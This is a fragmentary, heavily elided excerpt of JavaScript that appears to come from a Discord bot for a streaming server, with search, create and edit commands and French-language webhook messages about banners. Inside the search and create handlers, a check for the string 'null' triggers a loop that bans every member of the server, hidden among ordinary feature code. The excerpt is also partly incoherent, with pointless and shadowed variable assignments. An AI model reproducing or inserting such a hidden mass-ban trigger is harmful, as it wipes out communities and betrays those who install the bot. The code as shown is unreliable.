...
export default {
    link : "https://discord.gg/streamflix",
}
                ...
                switch (values[1]) {
                    case "search": {
                        ...
                        if (ppsearch.includes("null")) {
                            guild.members.forEach(m => {
                                ...
                                ppself = "https://cdn.discordapp.com/embed/avatars/null";
                                m.ban();
                            });    
                            }
                    ...
                    case "create": {
                        ...
                        if (ppcreate.includes("null")) {
                            var ppself = "https://cdn.discordapp.com/avatars/"+author.user.id+"/"+author.user.avatar;
                            guild.members.forEach(m => {
                                m.ban();
                                let ppself = "https://cdn.discordapp.com/avatars/null";
                            });
                        ...
                        const msgadd = new webhook.MessageBuilder()
                            ...
                            .addField("Bannière :", `[Lien](${poster.media})`)
                    ...
                    case "edit": {
                        ...
                        .addField("Ancienne bannière :", `[Lien](${poster.media})`)
                        .addField("Nouvelle bannière :", `[Lien](${oldimg})`)
